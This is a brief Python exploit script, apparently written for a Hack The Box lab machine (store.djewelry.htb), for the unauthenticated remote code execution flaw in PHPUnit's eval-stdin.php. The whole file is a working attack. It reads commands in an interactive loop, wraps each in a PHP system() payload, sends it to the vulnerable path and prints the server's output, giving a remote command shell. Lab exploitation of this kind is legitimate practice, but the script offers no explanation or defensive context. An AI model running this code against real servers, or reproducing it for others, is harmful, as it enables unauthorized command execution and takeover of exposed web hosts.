#!/usr/bin/env python3
import requests

# Exploit Title: PHP Unit 5.6.2 - Remote Code Execution (RCE) (Unauthenticated)
# Version: 5.6.2
# Tested on: Unit
# Script coder: akrecH
# Github: akr3ch


# target url
url = "http://store.djewelry.htb:80"

# vulnerable path
path= "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"

# header
#headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

while(True):
	# input from the user
	print('akr3ch:~$ ',end='')
	cmd = input()
	if cmd == 'exit' or cmd == 'quit':
		break
	else:
		# exploit
		data = f"<?php system(\"{cmd}\");?>"

		# request		
		output = requests.get(url+path, data=data)

		# print out the output as text
		print(output.text,end='')